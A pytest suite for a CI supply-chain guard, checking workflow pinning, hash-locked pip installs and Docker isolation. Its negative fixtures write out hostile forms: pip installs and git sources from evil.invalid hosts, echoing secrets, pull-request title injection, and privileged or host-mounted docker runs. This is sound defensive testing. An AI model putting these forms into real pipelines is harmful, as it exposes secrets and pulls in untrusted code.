"""Phase 3H-R3: negative and positive fixtures for ci/static_guard.py.

Every negative case starts from the real, committed file and applies exactly
one targeted mutation; it passes only if the guard reports the expected
violation code. A mutation that does not apply (the fixture no longer matches
the real file) fails the test instead of passing silently.
"""

from __future__ import annotations

import importlib.util
import shutil
from pathlib import Path
from types import ModuleType

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
WORKFLOW = REPO_ROOT / ".github" / "workflows" / "ci.yml"
DOCKERFILE = REPO_ROOT / "ci" / "isolated-tests" / "Dockerfile"
RUNNER = REPO_ROOT / "scripts" / "run_isolated_tests.sh"
BOOTSTRAP = REPO_ROOT / "scripts" / "bootstrap_locked_pip.sh"
CHECKOUT_SHA = "11d5960a326750d5838078e36cf38b85af677262"


def _load_guard() -> ModuleType:
    path = REPO_ROOT / "ci" / "static_guard.py"
    spec = importlib.util.spec_from_file_location("ci_static_guard", path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


guard = _load_guard()
WF = WORKFLOW.read_text(encoding="utf-8")
DF = DOCKERFILE.read_text(encoding="utf-8")
RN = RUNNER.read_text(encoding="utf-8")


def mutate(text: str, old: str, new: str, count: int = 1) -> str:
    assert text.count(old) >= 1, f"fixture does not apply: {old!r}"
    return text.replace(old, new, count)


def codes(violations: list) -> set[str]:
    return {violation.code for violation in violations}


def check_wf(text: str) -> set[str]:
    return codes(guard.check_workflow(text, image_python="3.9.25"))


# --- positive fixtures -------------------------------------------------------------


def test_repository_passes_the_guard() -> None:
    assert guard.check_repository(REPO_ROOT) == []


def test_guard_actually_parsed_the_workflow() -> None:
    doc = guard.parse_yaml(WF)
    assert tuple(doc["jobs"]) == guard.EXPECTED_JOBS
    steps = [step for job in doc["jobs"].values() for step in job["steps"]]
    uses = [step["uses"].text for step in steps if "uses" in step]
    assert len(uses) == 7 and all("@" in ref for ref in uses)
    checkouts = [step for step in steps if "uses" in step
                 and step["uses"].text.startswith("actions/checkout@")]
    assert len(checkouts) == 4
    assert all(step["with"]["persist-credentials"] == guard.Scalar("false", "plain", "",
               step["with"]["persist-credentials"].line) for step in checkouts)
    runs = [step["run"].text for step in steps if "run" in step]
    assert sum("--require-hashes" in run for run in runs) == 3
    assert runs.count("bash scripts/bootstrap_locked_pip.sh") == 3


def test_safe_url_comment_and_quoting_variants_pass() -> None:
    # A trailing comment does not change the value; `false # true` is false.
    text = mutate(WF, "persist-credentials: false", "persist-credentials: false # true")
    assert check_wf(text) == set()


@pytest.mark.parametrize(
    "command",
    [
        "python -m pip --version",
        "python -m pip check",
        "pip install --require-hashes --no-deps --only-binary=:all: -r requirements/ci-lock.txt",
        "python -m pip install --no-deps --no-build-isolation --no-index -e .",
        "pip install --no-deps --no-build-isolation --no-index -e . -e tools/generation_workspace",
        'python "$wheel/pip" install --require-hashes --no-deps --no-index --only-binary=:all: '
        '--force-reinstall --find-links "$work" -r requirements/ci-pip-lock.txt',
        "apt-get install -y --no-install-recommends git",
        "# pip install requests (a comment)",
        'echo "installing pip later"',
    ],
)
def test_reviewed_shell_forms_pass(command: str) -> None:
    assert guard.check_shell(command, "fixture") == []


def test_bootstrap_script_passes() -> None:
    assert guard.check_shell(BOOTSTRAP.read_text(encoding="utf-8"), "bootstrap") == []


# --- NEG-07: persist-credentials --------------------------------------------------------


@pytest.mark.parametrize(
    "replacement",
    [
        "persist-credentials: true",
        'persist-credentials: "false"',  # a string, not the boolean
        "persist-credentials: no",
        "persist-credentials: False",
        "persist-credentials: false#x",  # no space: the value is the string "false#x"
        "persist-credentials: ${{ false }}",
    ],
)
def test_neg07_persist_credentials_not_false_fails(replacement: str) -> None:
    assert "CHECKOUT_PERSISTS_CREDENTIALS" in check_wf(
        mutate(WF, "persist-credentials: false", replacement)
    )


def test_neg07_checkout_without_inputs_fails() -> None:
    text = mutate(WF, "        with:\n          persist-credentials: false\n", "")
    assert "CHECKOUT_PERSISTS_CREDENTIALS" in check_wf(text)


def test_neg07_checkout_token_input_fails() -> None:
    text = mutate(WF, "          persist-credentials: false\n",
                  "          persist-credentials: false\n          token: dummy\n")
    assert "ACTION_INPUTS" in check_wf(text)


def test_neg07_misspelled_input_key_fails() -> None:
    text = mutate(WF, "persist-credentials: false", "Persist-Credentials: false")
    assert "ACTION_INPUTS" in check_wf(text)


def test_neg07_checkout_without_credential_check_fails() -> None:
    step = ("      - name: Verify no persisted Git credentials\n"
            "        run: python3 -I scripts/check_no_persisted_credentials.py\n")
    assert "CHECKOUT_NOT_VERIFIED" in check_wf(mutate(WF, step, ""))


def test_neg07_weakened_credential_check_step_fails() -> None:
    text = mutate(WF, "        run: python3 -I scripts/check_no_persisted_credentials.py\n",
                  "        run: python3 -I scripts/check_no_persisted_credentials.py || true\n")
    assert "CHECKOUT_NOT_VERIFIED" in check_wf(text)


def test_neg07_credential_check_continue_on_error_fails() -> None:
    text = mutate(WF, "        run: python3 -I scripts/check_no_persisted_credentials.py\n",
                  "        run: python3 -I scripts/check_no_persisted_credentials.py\n"
                  "        continue-on-error: true\n")
    assert "STEP_KEYS" in check_wf(text)


# --- NEG-08: action references (N-4) ---------------------------------------------------


@pytest.mark.parametrize(
    "reference,code",
    [
        ("actions/checkout@v4 # v4.4.0", "ACTION_NOT_PINNED"),
        ("actions/checkout@main # v4.4.0", "ACTION_NOT_PINNED"),
        ("actions/checkout@11d5960 # v4.4.0", "ACTION_NOT_PINNED"),
        # A full SHA that is not the reviewed one (e.g. a commit from a fork).
        ("actions/checkout@" + "0" * 40 + " # v4.4.0", "ACTION_NOT_PINNED"),
        (f"actions/checkout@{CHECKOUT_SHA} # v4.3.0", "ACTION_VERSION_COMMENT"),
        (f"actions/checkout@{CHECKOUT_SHA}", "ACTION_VERSION_COMMENT"),
        (f"evil/checkout@{CHECKOUT_SHA} # v4.4.0", "ACTION_NOT_ALLOWED"),
        (f"Actions/Checkout@{CHECKOUT_SHA} # v4.4.0", "ACTION_NOT_ALLOWED"),
        ("./.github/actions/local", "ACTION_NOT_ALLOWED"),
        ("docker://alpine:3", "ACTION_NOT_ALLOWED"),
        (f'"actions/checkout@{CHECKOUT_SHA}" # v4.4.0', "ACTION_REFERENCE"),
    ],
)
def test_neg08_unpinned_or_unreviewed_action_fails(reference: str, code: str) -> None:
    text = mutate(WF, f"actions/checkout@{CHECKOUT_SHA} # v4.4.0", reference)
    assert code in check_wf(text)


@pytest.mark.parametrize(
    "line",
    [
        f'      - "uses": actions/checkout@{CHECKOUT_SHA} # v4.4.0',  # quoted key
        f"      - {{uses: actions/checkout@{CHECKOUT_SHA}}}",  # flow mapping
        f"      - ? uses\n        : actions/checkout@{CHECKOUT_SHA}",  # complex key
    ],
)
def test_neg08_alternative_uses_syntax_fails(line: str) -> None:
    text = mutate(WF, f"      - uses: actions/checkout@{CHECKOUT_SHA} # v4.4.0", line)
    assert check_wf(text) & {"YAML_UNSUPPORTED_KEY", "YAML_UNSUPPORTED_SCALAR",
                             "YAML_STRUCTURE"}


def test_neg08_reusable_workflow_job_fails() -> None:
    text = mutate(WF, "  lint:\n    runs-on: ubuntu-latest\n",
                  "  lint:\n    uses: evil/repo/.github/workflows/x.yml@main\n"
                  "    runs-on: ubuntu-latest\n")
    assert "JOB_KEYS" in check_wf(text)


# --- NEG-09: Docker base image ----------------------------------------------------------


@pytest.mark.parametrize(
    "replacement",
    [
        "FROM python:3.9-slim-bookworm",
        "FROM python:3.9-slim-bookworm@sha256:" + "0" * 64,
        "FROM --platform=linux/amd64 " + guard.BASE_IMAGE,
        "FROM " + guard.BASE_IMAGE + " AS build",
        "from " + guard.BASE_IMAGE,
    ],
)
def test_neg09_base_image_not_pinned_fails(replacement: str) -> None:
    text = mutate(DF, "FROM " + guard.BASE_IMAGE, replacement)
    assert codes(guard.check_dockerfile(text)) & {"BASE_IMAGE_NOT_PINNED", "DOCKERFILE_INSTRUCTION"}


def test_neg09_second_stage_fails() -> None:
    text = mutate(DF, "WORKDIR /app\n", "FROM python:3.9\nWORKDIR /app\n")
    assert "BASE_IMAGE_NOT_PINNED" in codes(guard.check_dockerfile(text))


@pytest.mark.parametrize(
    "instruction", ["ARG IMAGE=python:3.9", "ADD https://example.invalid/x /x"]
)
def test_neg09_unreviewed_dockerfile_instruction_fails(instruction: str) -> None:
    text = mutate(DF, "WORKDIR /work\n", f"{instruction}\nWORKDIR /work\n")
    assert "DOCKERFILE_INSTRUCTION" in codes(guard.check_dockerfile(text))


def test_neg09_unlocked_install_in_dockerfile_fails() -> None:
    text = mutate(DF, "    && pip check \\\n",
                  "    && pip install requests \\\n    && pip check \\\n")
    assert "PIP_UNLOCKED_REQUIREMENT" in codes(guard.check_dockerfile(text))


# --- NEG-10 / NEG-11: Layer B docker run --------------------------------------------------


@pytest.mark.parametrize(
    "old,new,code",
    [
        ("  --network none \\\n", "", "LAYER_B_MISSING"),  # NEG-10
        ("  --network none \\\n", "  --network bridge \\\n", "LAYER_B_MISSING"),
        ("  --network none \\\n", "  --network=none \\\n", "LAYER_B_OPTION"),
        ("  --network none \\\n", "  --network none \\\n  --network host \\\n",
         "LAYER_B_DUPLICATE"),
        ("  --read-only \\\n", "", "LAYER_B_MISSING"),  # NEG-11
        ("  --read-only \\\n", "  --read-only=false \\\n", "LAYER_B_OPTION"),
        ("  --cap-drop ALL \\\n", "", "LAYER_B_MISSING"),
        ("--user 10001:10001", "--user 0:0", "LAYER_B_MISSING"),
        ("  --read-only \\\n", "  --read-only \\\n  -v /:/host \\\n", "LAYER_B_OPTION"),
        ("  --read-only \\\n", "  --read-only \\\n  --privileged \\\n", "LAYER_B_OPTION"),
        ("  --read-only \\\n", "  --read-only \\\n  --mount type=bind,src=/,dst=/h \\\n",
         "LAYER_B_OPTION"),
        ("  -e HOME=/tmp/home \\\n", "  -e NOTION_API_KEY \\\n", "LAYER_B_ENV"),
        ("  -e HOME=/tmp/home \\\n", '  -e "NOTION_API_KEY=$NOTION_API_KEY" \\\n', "LAYER_B_ENV"),
    ],
)
def test_neg10_neg11_weakened_isolation_fails(old: str, new: str, code: str) -> None:
    assert code in codes(guard.check_runner(mutate(RN, old, new)))


def test_neg10_second_docker_run_fails() -> None:
    text = RN + '\ndocker run --rm "$IMAGE" pytest\n'
    assert "LAYER_B_RUN" in codes(guard.check_runner(text))


# --- NEG-12: YAML outside the supported subset ------------------------------------------


@pytest.mark.parametrize(
    "old,new,code",
    [
        ("permissions:\n  contents: read\n",
         "permissions:\n  contents: read\npermissions:\n  contents: write\n", "YAML_DUPLICATE_KEY"),
        ("persist-credentials: false", "persist-credentials: &p false", "YAML_UNSUPPORTED_SCALAR"),
        ("persist-credentials: false", "persist-credentials: *p", "YAML_UNSUPPORTED_SCALAR"),
        ("persist-credentials: false", "<<: *defaults", "YAML_UNSUPPORTED_KEY"),
        ("persist-credentials: false", "persist-credentials: !!bool false",
         "YAML_UNSUPPORTED_SCALAR"),
        ("persist-credentials: false", "persist-credentials: 'false'", "YAML_UNSUPPORTED_SCALAR"),
        ("persist-credentials: false", "\tpersist-credentials: false", "YAML_TAB"),
        ("name: CI\n", "---\nname: CI\n", "YAML_DOCUMENT"),
        ('python-version: "3.9.25"', 'python-version: "3.9.2\\x35"', "YAML_UNSUPPORTED_SCALAR"),
        ("run: bash scripts/run_isolated_tests.sh\n", "run: >\n          bash x\n",
         "YAML_UNSUPPORTED_SCALAR"),
        ("    steps:\n      - uses:", "    steps:\n    - uses:", "YAML_INDENT"),
        ("persist-credentials: false", "persist-credentials:\n            false",
         "YAML_UNSUPPORTED_KEY"),
        ("name: CI\n", "name: CI\r\n", "YAML_ENCODING"),
    ],
)
def test_neg12_unsupported_or_ambiguous_yaml_fails(old: str, new: str, code: str) -> None:
    assert code in check_wf(mutate(WF, old, new))


@pytest.mark.parametrize(
    "old,new,code",
    [
        ("permissions:\n  contents: read\n", "permissions:\n  contents: write\n",
         "PERMISSIONS_NOT_READ_ONLY"),
        ("permissions:\n  contents: read\n", "permissions: write-all\n",
         "PERMISSIONS_NOT_READ_ONLY"),
        ("permissions:\n  contents: read\n",
         "permissions:\n  contents: read\n  id-token: write\n", "PERMISSIONS_NOT_READ_ONLY"),
        ("  lint:\n    runs-on: ubuntu-latest\n",
         "  lint:\n    permissions: write-all\n    runs-on: ubuntu-latest\n", "JOB_KEYS"),
        ("  lint:\n    runs-on: ubuntu-latest\n",
         "  lint:\n    env:\n      X: y\n    runs-on: ubuntu-latest\n", "JOB_KEYS"),
        ("  lint:\n    runs-on: ubuntu-latest\n", "  lint:\n    runs-on: self-hosted\n", "RUNNER"),
        ("  lint:\n", "  extra:\n    runs-on: ubuntu-latest\n    timeout-minutes: 1\n"
         "    steps:\n      - run: echo hi\n  lint:\n", "WORKFLOW_JOBS"),
        ("  type-check:\n", "  typecheck:\n", "WORKFLOW_JOBS"),
        ("  workflow_dispatch:\n", "  workflow_dispatch:\n  pull_request_target:\n",
         "WORKFLOW_TRIGGERS"),
        ("concurrency:\n", "env:\n  X: y\nconcurrency:\n", "WORKFLOW_KEYS"),
        ("run: bash scripts/check_isolation_red.sh",
         "run: echo ${{ secrets.NOTION_API_KEY }}", "SECRET_REFERENCE"),
        ("run: bash scripts/check_isolation_red.sh",
         "run: echo ${{ github.event.pull_request.title }}", "DYNAMIC_EXPRESSION"),
        ('python-version: "3.9.25"', "python-version: 3.10", "RUNNER_PYTHON"),
        ('python-version: "3.9.25"', 'python-version: "3.12"', "RUNNER_PYTHON"),
    ],
)
def test_neg12_weakened_workflow_structure_fails(old: str, new: str, code: str) -> None:
    assert code in check_wf(mutate(WF, old, new))


# --- N-3: pip forms ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "command,code",
    [
        ("pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("pip -q install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("pip --isolated install requests", "PIP_FORBIDDEN_COMMAND"),
        ("pip  install   requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("pip3 install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("pip3.9 install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("/usr/bin/pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("python3 -m pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("python -I -m pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("python -mpip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("X=1 pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("sudo pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("true && pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("true; pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("false || pip install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("p'i'p install requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("pip install \\\n  requests", "PIP_UNLOCKED_REQUIREMENT"),
        ("pip download requests", "PIP_FORBIDDEN_COMMAND"),
        ("pip wheel requests", "PIP_FORBIDDEN_COMMAND"),
        ("pip config set global.index-url https://evil.invalid", "PIP_FORBIDDEN_COMMAND"),
        ("pip install --upgrade pip", "PIP_UNREVIEWED_OPTION"),
        ("pip install -U pip", "PIP_UNREVIEWED_OPTION"),
        ("pip install -i https://evil.invalid/simple --no-deps x", "PIP_UNREVIEWED_OPTION"),
        ("pip install --extra-index-url https://evil.invalid x", "PIP_UNREVIEWED_OPTION"),
        ("pip install --no-deps --no-build-isolation --no-index "
         "--find-links https://evil.invalid/ -e .", "PIP_REMOTE_SOURCE"),
        ("pip install --no-deps --no-build-isolation --no-index "
         "--find-links=https://evil.invalid/ -e .", "PIP_UNREVIEWED_OPTION"),
        ("pip install --no-deps --no-build-isolation --find-links ./wheels -e .",
         "PIP_REMOTE_SOURCE"),
        ("pip install --no-deps --no-build-isolation --no-index -e git+https://evil.invalid/x",
         "PIP_REMOTE_SOURCE"),
        ("pip install --no-deps --no-build-isolation -e .", "PIP_NOT_HASH_LOCKED"),
        ("pip install --no-deps --only-binary=:all: -r requirements/ci-lock.txt",
         "PIP_NOT_HASH_LOCKED"),
        ("pip install --require-hashes --no-deps --only-binary=:all: -r requirements/other.txt",
         "PIP_NOT_HASH_LOCKED"),
        ("pip install --require-hashes --only-binary=:all: -r requirements/ci-lock.txt",
         "PIP_RESOLVES_DEPENDENCIES"),
        ("pip install --require-hashes --no-deps --only-binary=:all: -r requirements/ci-lock.txt "
         "-e .", "PIP_NOT_HASH_LOCKED"),
        ("pipx install requests", "FORBIDDEN_INSTALLER"),
        ("easy_install requests", "FORBIDDEN_INSTALLER"),
        ("uv pip install requests", "FORBIDDEN_INSTALLER"),
        ("python -m ensurepip --upgrade", "FORBIDDEN_INSTALLER"),
        ("$(which pip) install requests", "UNRECOGNIZED_PIP_INVOCATION"),
        ("$PIP install requests", "UNRECOGNIZED_PIP_INVOCATION"),
        ("env -i pip install requests", "UNRECOGNIZED_PIP_INVOCATION"),
        ('pip install "requests', "SHELL_UNPARSABLE"),
        ("pip", "PIP_NO_COMMAND"),
    ],
)
def test_n3_unlocked_or_unverifiable_pip_forms_fail(command: str, code: str) -> None:
    assert code in codes(guard.check_shell(command, "fixture"))


def test_n3_unlocked_install_in_workflow_run_block_fails() -> None:
    text = mutate(WF, "          python -m pip check\n",
                  "          python -m pip check\n          pip -q install requests\n")
    assert "PIP_UNLOCKED_REQUIREMENT" in check_wf(text)


def test_n3_pip_before_bootstrap_fails() -> None:
    step = ("      - name: Install hash-verified pip\n"
            "        run: bash scripts/bootstrap_locked_pip.sh\n")
    assert check_wf(mutate(WF, step, "")) >= {"PIP_NOT_BOOTSTRAPPED", "PIP_BEFORE_BOOTSTRAP"}


# --- repository layout -------------------------------------------------------------------


def _repo_copy(tmp_path: Path) -> Path:
    for relative in (".github/workflows/ci.yml", "ci/isolated-tests/Dockerfile"):
        (tmp_path / relative).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy(REPO_ROOT / relative, tmp_path / relative)
    shutil.copytree(REPO_ROOT / "scripts", tmp_path / "scripts",
                    ignore=shutil.ignore_patterns("__pycache__"))
    assert guard.check_repository(tmp_path) == []
    return tmp_path


def test_layout_copy_passes(tmp_path: Path) -> None:
    _repo_copy(tmp_path)


@pytest.mark.parametrize("name", ["other.yml", "ci.yaml", "README"])
def test_additional_workflow_file_fails(tmp_path: Path, name: str) -> None:
    root = _repo_copy(tmp_path)
    (root / ".github" / "workflows" / name).write_text("name: x\n", encoding="utf-8")
    assert "WORKFLOW_FILES" in codes(guard.check_repository(root))


def test_local_action_fails(tmp_path: Path) -> None:
    root = _repo_copy(tmp_path)
    (root / ".github" / "actions" / "x").mkdir(parents=True)
    (root / ".github" / "actions" / "x" / "action.yml").write_text("runs: {}\n", encoding="utf-8")
    assert "LOCAL_ACTION" in codes(guard.check_repository(root))


@pytest.mark.parametrize("relative", [".github/workflows/ci.yml", "ci/isolated-tests/Dockerfile",
                                      "scripts/run_isolated_tests.sh"])
def test_missing_checked_file_fails(tmp_path: Path, relative: str) -> None:
    root = _repo_copy(tmp_path)
    (root / relative).unlink()
    assert codes(guard.check_repository(root)) & {"MISSING_FILE", "WORKFLOW_FILES"}


def test_unlocked_install_in_any_script_fails(tmp_path: Path) -> None:
    root = _repo_copy(tmp_path)
    (root / "scripts" / "extra.sh").write_text("#!/bin/sh\npip install requests\n",
                                               encoding="utf-8")
    assert "PIP_UNLOCKED_REQUIREMENT" in codes(guard.check_repository(root))
